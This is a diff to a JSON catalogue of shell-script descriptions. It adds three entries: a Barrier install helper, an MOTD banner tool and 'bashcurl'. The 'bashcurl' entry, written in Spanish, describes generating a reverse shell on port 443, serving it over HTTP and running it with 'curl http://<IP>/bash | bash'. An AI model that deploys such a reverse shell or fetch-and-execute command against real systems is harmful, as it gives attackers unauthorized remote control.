@@ -1,7 +1,25 @@
 {
 
+"bashcurl": {
+    "name": "bashcurl",
+    "short_desc": "Genera un script de reverse shell y lanza un servidor HTTP.",
+    "detailed_desc": "Este script detecta automáticamente la IP del sistema, genera un script de reverse shell en /tmp/apache/bash con conexión TCP hacia esa IP por el puerto 443, y ofrece iniciar un servidor HTTP en la misma ruta. El script está diseñado para ser descargado y ejecutado remotamente mediante curl, por ejemplo: 'curl http://<IP>/bash | bash'."
+},
 
-    
+
+"barrierinst": {
+    "name": "barrierinst",
+    "short_desc": "Installs Barrier via Flatpak and sets up a startup alias.",
+    "detailed_desc": "This script installs Flatpak, adds the Flathub repository, and installs the Barrier application (used for sharing keyboard/mouse across devices) via Flatpak. It also appends a convenient alias to ~/.zshrc for launching Barrier and reloads the shell configuration to apply the alias immediately."
+},
+
+
+"bannerssh": {
+    "name": "bannerssh",
+    "short_desc": "Disables dynamic MOTD scripts and sets a custom static message.",
+    "detailed_desc": "This script disables all dynamic MOTD components by renaming the scripts in /etc/update-motd.d. It optionally prompts the user to set a static welcome message, including an ASCII banner and custom text, which is written to /etc/motd. Future modifications can be made manually by editing that file."
+},
+
 
 "bannerm": {
     "name": "bannerm",
